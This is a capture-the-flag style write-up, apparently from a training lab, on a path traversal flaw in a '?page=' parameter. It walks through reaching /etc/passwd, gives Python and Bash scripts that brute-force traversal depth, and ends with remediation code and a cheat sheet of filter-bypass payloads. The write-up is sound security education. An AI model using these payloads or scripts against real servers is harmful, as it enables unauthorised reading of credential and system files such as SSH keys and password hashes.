# 🚩 3 : Path Traversal via `?page=` Parameter

## 📝 Overview

This breach demonstrates how web applications can be compromised when they
use user-supplied input to directly construct file paths without any
validation or sanitization.

The core problem is this: the server takes whatever value you put in the
`?page=` parameter and uses it directly to load a file from the filesystem.
By injecting special characters (`../`), we can "walk up" the directory tree
and access files that were never meant to be accessible, including sensitive
system files.

## 🔍 The Vulnerability: Directory Traversal

### What is Path Traversal?

Path traversal is a trick used to sneak into secret webpages. 

Imagine a library where the librarian fetches any book you ask
for by name. Normally you would ask for books from the public shelves. But what
if you asked for "go upstairs, turn left, open the private office, and bring
me the confidential files"? A naive librarian might just do it.

On a web server, `../` is the equivalent of "go up one folder." By chaining
multiple `../` sequences together, an attacker can climb all the way up to
the root of the filesystem and read any file the server has access to.

### How the Vulnerable Code Works

The application likely uses code similar to this on the server:

```php
include($_GET['page']);
```

or

```php
include('/var/www/html/pages/' . $_GET['page']);
```

This takes whatever value is in the `?page=` URL parameter and directly
uses it to load a file. There is no check to ensure the requested file
is within the intended directory. The server simply trusts the input.

### What is `/etc/passwd`?

`/etc/passwd` is a standard file found on every Linux system. It contains
a list of all user accounts on the system, including their usernames, user
IDs, home directories, and default shells. While it does not contain actual
passwords (those are stored in `/etc/shadow`), it is a sensitive file that
reveals information about the system's users and structure, information
an attacker can use to plan further attacks.

Reading `/etc/passwd` is the classic proof-of-concept for a path traversal
vulnerability because it exists on every Linux server and requires no
special permissions to read in a misconfigured system.

## 🛠 The Exploit

### Step 1: Discovery

The `?page=` parameter is used throughout the application to load different
pages. For example:

```
http://localhost:8080/?page=signin
http://localhost:8080/?page=members
http://localhost:8080/?page=feedback

```

This pattern immediately raises suspicion. If the server is loading files
based on the `page` value, what happens if we give it something unexpected?

### Step 2: Testing the Vulnerability. Trial and Error

Path traversal requires finding exactly how many `../` sequences are needed
to escape the web root and reach the target file. This is done by trial and
error, reading the server's responses carefully.

**Attempt 1.Too few traversals:**

```
http://localhost:8080/?page=/../../../etc/passwd

```

Response: "Nope"

The server responded with "Nope", telling us that we did not reach the target.
Either the traversal depth was insufficient, or the leading `/` caused
partial filtering. We need to go deeper.

**Attempt 2. Getting closer:**

```
http://localhost:8080/?page=../../../../etc/passwd

```

Response: "Almost"

Progress! The server responded with "Almost", meaning we are on the right
track but have not quite escaped the web root yet. We need more `../`
sequences to climb higher in the directory tree.

**Attempt 3. Success:**

```
http://localhost:8080/?page=../../../../../../../etc/passwd

```

Response: "Congratulations!! The flag is..."

Seven `../` sequences was enough to fully escape the web root and reach
`/etc/passwd`. The server read the file and returned the flag.

### Step 3: Understanding Why It Works

Without any input validation, here is what happens on the server when we
send `../../../../../../../etc/passwd`.

The server starts from its web root, for example:

```
/var/www/html/pages/

```

Then it applies each `../` to climb up one directory at a time:

```
/var/www/html/pages/../  →  /var/www/html/
/var/www/html/../        →  /var/www/
/var/www/../             →  /var/
/var/../                 →  /

```

On Linux, once you reach the root `/`, additional `../` sequences have no
effect — you simply stay at the root. So adding extra `../` sequences is
harmless and actually useful: it guarantees you reach the root regardless
of how deep the web root is.

From the root, the server then appends `etc/passwd`:

```
/ + etc/passwd  →  /etc/passwd

```

The server reads this file and returns its contents, or in this case,
triggers the flag because it detected a successful traversal.

### Step 4: The Result

```
FLAG: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

## 🌍 Real-World Impact

Path traversal is listed in the OWASP Top 10 as one of the most critical
web application security risks. Here are real-world scenarios where this
vulnerability causes serious damage.

**a) Source Code Theft**
An attacker traverses to the application's own PHP or configuration files:

```
?page=../config/database.php
```

This reveals database credentials, API keys, and application secrets.

**b) Password File Access**
Reading `/etc/shadow` (if permissions allow) gives an attacker hashed
passwords for every user on the system, which can then be cracked offline.

**c) SSH Key Theft**
Reading `/root/.ssh/id_rsa` gives an attacker the server's private SSH key,
allowing them to log into the server directly.

**d) Log File Poisoning**
An attacker reads log files to gather information about the system, then
injects malicious content into them to exploit log-based vulnerabilities.

**e) Application Configuration Exposure**
Reading files like `/etc/nginx/nginx.conf` or `/etc/apache2/apache2.conf`
reveals the server's internal structure, helping plan further attacks.

## 🤖 Script Automation

Instead of manually trying different depths one by one, we could have automated
the entire process using a script. This is particularly useful in real penetration
tests where the correct depth is unknown and could be anywhere from 1 to 20+.

### Python Script

```python
import requests

base_url = "http://localhost:8080/"

for depth in range(1, 15):
    payload = "../" * depth + "etc/passwd"
    url = base_url + "?page=" + payload
    response = requests.get(url)

    if "Nope" in response.text:
        print(f"Depth {depth}: Nope, not deep enough yet")
    elif "Almost" in response.text:
        print(f"Depth {depth}: Almost! Getting closer...")
    elif "flag" in response.text.lower():
        print(f"Depth {depth}: FLAG FOUND!")
        print(f"Winning URL: {url}")
        for line in response.text.split('\n'):
            if 'flag' in line.lower():
                print(line.strip())
        break
    else:
        print(f"Depth {depth}: Unknown response")
```

The script starts with 1 `../` and increases the depth one by one. After
each attempt it reads the server's response. If it sees "Nope" it goes
deeper, if it sees "Almost" it knows it is getting close, and if it finds
the flag it prints the winning URL and stops.

Sample output:

```
Depth 1: Nope, not deep enough yet
Depth 2: Nope, not deep enough yet
Depth 3: Nope, not deep enough yet
Depth 4: Almost! Getting closer...
Depth 5: Almost! Getting closer...
Depth 6: Almost! Getting closer...
Depth 7: FLAG FOUND!
Winning URL: http://localhost:8080/?page=../../../../../../../etc/passwd
```

### Bash Script

```bash
for depth in $(seq 1 15); do
    payload=$(printf '../%.0s' $(seq 1 $depth))
    response=$(curl -s "http://localhost:8080/?page=${payload}etc/passwd")

    if echo "$response" | grep -qi "flag"; then
        echo "FLAG FOUND at depth $depth!"
        echo "$response" | grep -i flag
        break
    elif echo "$response" | grep -qi "almost"; then
        echo "Depth $depth: Almost!"
    else
        echo "Depth $depth: Nope"
    fi
done
```

`printf '../%.0s' $(seq 1 $depth)` is a bash trick that repeats `../`
exactly `$depth` times, so at depth 4 it produces `../../../../`. The
`curl -s` flag fetches the page silently without a progress bar, and
`grep -qi` searches case-insensitively for the word "flag".

### How to Run the Scripts

**Running the Python script:**

First install the requests library if you do not have it:

```bash
pip3 install requests
```

Then save the script to a file and run it:

```bash
python3 traversal.py
```

**Running the Bash script:**

Save the script to a file, then make it executable and run it:

```bash
chmod +x traversal.sh
./traversal.sh
```

The `chmod +x` command gives the file permission to be executed as a program.
Without this step the terminal will refuse to run it.

### Why Use a Script?

In a real penetration test, scripts are preferred over manual testing because
the correct depth is unknown and you do not know how deep the web root is on
any given server. A script tests all depths in seconds instead of minutes of
manual work, and is reproducible. Professional tools like dirb, ffuf, and Burp Suite's Intruder do this automatically with thousands of pre-built path traversal payloads,
including URL-encoded variants that bypass basic filters.

## 🛡️ Remediation Strategies

### 1. Whitelist Allowed Pages

The safest fix is to never use user input directly as a file path at all.
Instead, maintain a whitelist of allowed page names and map them to their
corresponding files on the server:

```php
$allowed_pages = [
    'home'     => 'pages/home.php',
    'signin'   => 'pages/signin.php',
    'members'  => 'pages/members.php',
    'feedback' => 'pages/feedback.php',
];

$page = $_GET['page'];

if (array_key_exists($page, $allowed_pages)) {
    include($allowed_pages[$page]);
} else {
    include('pages/404.php');
}
```

With this approach, even if an attacker sends `../../../etc/passwd`, the
server will simply not find it in the whitelist and show a 404 page. The
filesystem is never touched with user-supplied input.

### 2. Canonicalize and Validate Paths

If dynamic file loading is truly necessary, use `realpath()` to resolve
the full absolute path of the requested file, then verify it starts with
the intended base directory:

```php
$base_dir = realpath('/var/www/html/pages/');
$requested = realpath($base_dir . '/' . $_GET['page'] . '.php');

if ($requested !== false && strpos($requested, $base_dir) === 0) {
    include($requested);
} else {
    include('pages/403.php');
}
```

`realpath()` resolves all `../` sequences and symbolic links, returning the
true absolute path. By checking that the result starts with `$base_dir`, we
guarantee the file is within the intended directory.

### 3. Strip Dangerous Characters

As a defense-in-depth measure, strip or reject any input containing `../`,
`..\`, or null bytes before processing:

```php
$page = str_replace(['../', '..', '.\\'], '', $_GET['page']);
```

This should never be the only defense. Determined attackers can bypass simple
string filtering using URL encoding (`%2e%2e%2f`) or other techniques. Always
combine this with path canonicalization.

### 4. Run the Server with Minimal Permissions

Even if a path traversal vulnerability exists, its impact can be limited by
ensuring the web server process only has read access to the files it actually
needs. It should never run as root, and sensitive system files should have
restrictive permissions that prevent the web server user from reading them.

### 5. Use a Web Application Firewall (WAF)

A WAF can detect and block common path traversal patterns like `../` in URL
parameters before they ever reach the application. This is a useful
defense-in-depth layer, but should never replace proper input validation.

## 📊 Path Traversal Cheat Sheet

| Payload | Meaning |
|---------|---------|
| `../` | Go up one directory |
| `../../` | Go up two directories |
| `../../../../../../../etc/passwd` | Go up many levels to reach root, then read passwd |
| `%2e%2e%2f` | URL-encoded version of `../` (bypasses simple filters) |
| `..%2f` | Partial URL encoding (bypasses some filters) |
| `....//` | Double dot slash (bypasses some filters) |

The key insight is that on Linux, once you reach the filesystem root `/`,
additional `../` sequences are ignored. This means you can always use more
`../` than needed. It will not break the traversal, only guarantee success
regardless of the web root depth.